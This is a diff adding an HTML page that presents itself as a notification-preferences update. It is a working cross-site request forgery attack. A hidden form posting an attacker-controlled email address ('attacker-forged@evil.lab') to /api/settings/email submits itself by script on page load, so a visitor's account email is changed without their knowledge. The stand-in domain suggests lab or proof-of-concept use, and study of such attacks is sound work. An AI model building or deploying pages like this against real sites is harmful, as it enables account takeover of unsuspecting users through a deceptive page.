@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Account update</title>
+  </head>
+  <body>
+    <p>Updating notification preferences…</p>
+    <form id="f" method="post" action="/api/settings/email">
+      <input type="hidden" name="email" value="attacker-forged@evil.lab" />
+    </form>
+    <script>
+      document.getElementById("f").submit();
+    </script>
+  </body>
+</html>
